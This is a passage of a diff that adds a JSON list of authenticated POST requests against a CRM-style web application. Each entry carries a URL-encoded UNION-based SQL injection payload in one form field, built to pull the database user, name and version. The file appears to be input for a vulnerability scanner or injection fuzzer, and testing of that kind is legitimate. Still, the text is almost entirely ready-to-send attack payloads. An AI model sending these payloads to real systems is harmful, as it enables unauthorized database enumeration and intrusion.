+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/4", 
+    "param": {
+      "Actions[associationType]": [
+        "media"
+      ], 
+      "Actions[dueDate]": [
+        "a"
+      ], 
+      "SelectedTab": [
+        "a"
+      ], 
+      "Actions[associationId]": [
+        "4"
+      ], 
+      "Actions[actionDescription]": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "Actions[completeDate]": [
+        "a"
+      ]
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/calendar", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "Contacts[firstName]": [
+        "First Name"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/8", 
+    "param": {
+      "Actions[associationType]": [
+        "media%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "Actions[dueDate]": [
+        "a"
+      ], 
+      "SelectedTab": [
+        "a"
+      ], 
+      "Actions[associationId]": [
+        "8"
+      ], 
+      "Actions[actionDescription]": [
+        "a"
+      ], 
+      "Actions[completeDate]": [
+        "a"
+      ]
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs?Docs_sort=createDate.desc", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "Contacts[firstName]": [
+        "First Name"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/docs", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/1002", 
+    "param": {
+      "Actions[associationType]": [
+        "media"
+      ], 
+      "Actions[dueDate]": [
+        "a"
+      ], 
+      "SelectedTab": [
+        "a"
+      ], 
+      "Actions[associationId]": [
+        "1002"
+      ], 
+      "Actions[actionDescription]": [
+        "a"
+      ], 
+      "Actions[completeDate]": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/update?id=10", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/2000", 
+    "param": {
+      "Actions[associationType]": [
+        "media"
+      ], 
+      "Actions[dueDate]": [
+        "a"
+      ], 
+      "SelectedTab": [
+        "a"
+      ], 
+      "Actions[associationId]": [
+        "2000"
+      ], 
+      "Actions[actionDescription]": [
+        "a"
+      ], 
+      "Actions[completeDate]": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/2001", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/2002", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media?Media_sort=createDate", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media?Media_sort=associationType", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/products?Product_sort=type", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/products?Product_sort=type.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/update?id=1003", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/media/update?id=1003", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name"
+      ]
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes/create", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/bugReports?BugReports_sort=severity", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/profile/profiles?Profile_sort=tagLine", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes?Quote_sort=assignedTo.desc", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes/indexInvoice?Quote_sort=assignedTo", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes/indexInvoice?Quote_sort=invoiceCreateDate", 
+    "param": {
+      "Contacts[phone]": [
+        "Phone"
+      ], 
+      "Contacts[lastName]": [
+        "Last Name"
+      ], 
+      "Contacts[email]": [
+        "Email"
+      ], 
+      "Contacts[firstName]": [
+        "First Name%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes/indexInvoice?Quote_sort=invoiceStatus", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/profile/update/3", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/services/index", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/marketing", 
+    "param": {
+      "Campaign[name]": [
+        "a"
+      ], 
+      "Campaign[id]": [
+        "a"
+      ], 
+      "Campaign[lastUpdated]": [
+        "a"
+      ], 
+      "Campaign[description]": [
+        "a"
+      ], 
+      "Campaign[createDate]": [
+        "a"
+      ], 
+      "Campaign[assignedTo]": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/accounts", 
+    "param": {
+      "Accounts[annualRevenue]": [
+        "a"
+      ], 
+      "Accounts[tickerSymbol]": [
+        "a"
+      ], 
+      "Accounts[id]": [
+        "a"
+      ], 
+      "Accounts[associatedContacts]": [
+        "a"
+      ], 
+      "Accounts[name]": [
+        "a"
+      ], 
+      "Accounts[employees]": [
+        "a"
+      ], 
+      "Accounts[phone]": [
+        "a"
+      ], 
+      "Accounts[type]": [
+        "a"
+      ], 
+      "Accounts[description]": [
+        "a"
+      ], 
+      "Accounts[assignedTo]": [
+        "a"
+      ], 
+      "Accounts[website]": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes/indexInvoice?Quote_sort=assignedTo.desc", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/index", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/contacts/index", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes/indexInvoice?Quote_sort=name.desc", 
+    "param": {
+      "note-message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/quotes/indexInvoice?Quote_sort=invoiceCreateDate.desc", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/services?Services_sort=impact", 
+    "param": {
+      "url-url": [
+        "a"
+      ], 
+      "url-title": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
+    }, 
+    "loginrequired": "true", 
+    "loginurl": "https://app9.com/index-test.php/site/login", 
+    "type": "POST"
+  }, 
+  {
+    "loginpayload": {
+      "LoginForm[username]": [
+        "test"
+      ], 
+      "LoginForm[password]": [
+        "test"
+      ], 
+      "LoginForm[rememberMe]": [
+        "0"
+      ]
+    }, 
+    "url": "https://app9.com/index-test.php/opportunities?Opportunity_sort=lastActivity", 
+    "param": {
+      "message": [
+        "a%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+"
+      ]
+    }, 
+    "headers": {
+      "referer": "some random header", 
+      "Referer": "https://app5.com/www/index.php", 
